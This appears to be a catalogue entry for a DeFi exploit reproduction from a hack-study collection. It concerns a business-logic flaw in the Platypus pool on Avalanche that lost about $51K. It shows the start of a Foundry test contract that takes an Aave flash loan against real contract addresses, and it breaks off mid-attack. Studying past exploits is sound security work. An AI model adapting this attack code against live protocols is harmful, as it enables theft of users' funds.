# [?] Platypus - Bussiness Logic Flaw

## Summary
Severity: Unknown
Chain: Avalanche
Component: Platypus02
Published: 2023-07-12
Source: https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2023-07/Platypus02_exp.sol
Type: defi-exploit-poc

## Details
Lost: ~$51K

```solidity
contract ContractTest is Test {
    IERC20 USDC = IERC20(0xB97EF9Ef8734C71904D8002F8b6Bc66Dd9c48a6E);
    IERC20 USDTe = IERC20(0xc7198437980c041c805A1EDcbA50c1Ce5db95118);
    IERC20 LP_USDC = IERC20(0x06f01502327De1c37076Bea4689a7e44279155e9);
    IPlatypusPool PlatypusPool = IPlatypusPool(0xbe52548488992Cc76fFA1B42f3A58F646864df45);
    IAaveFlashloan aaveV3 = IAaveFlashloan(0x794a61358D6845594F94dc1DB02A252b5b4814aD);

    function setUp() public {
        vm.createSelectFork("avalanche", 32_470_736);
        vm.label(address(USDTe), "USDTe");
        vm.label(address(USDC), "USDC");
        vm.label(address(LP_USDC), "LP_USDC");
        vm.label(address(aaveV3), "aaveV3");
        vm.label(address(PlatypusPool), "PlatypusPool");
    }

    function testExploit() public {
        aaveV3.flashLoanSimple(address(this), address(USDC), 85_000 * 1e6, new bytes(0), 0);

        emit log_named_decimal_uint(
            "Attacker USDC balance after exploit", USDC.balanceOf(address(this)), USDC.decimals()
        );
    }

    function executeOperation(
        address asset,
        uint256 amount,
        uint256 premium,
        address initator,
        bytes calldata params
    ) external payable returns (bool) {
        USDC.approve(address(aaveV3), amount + premium);

        USDC.approve(address(PlatypusPool), USDC.balanceOf(address(this)));
        PlatypusPool.deposit(address(USDC), USDC.balanceOf(address(this)), address(this), block.timestamp); // deposit USDC
```

_Trimmed to 38 lines — full report: https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2023-07/Platypus02_exp.sol_
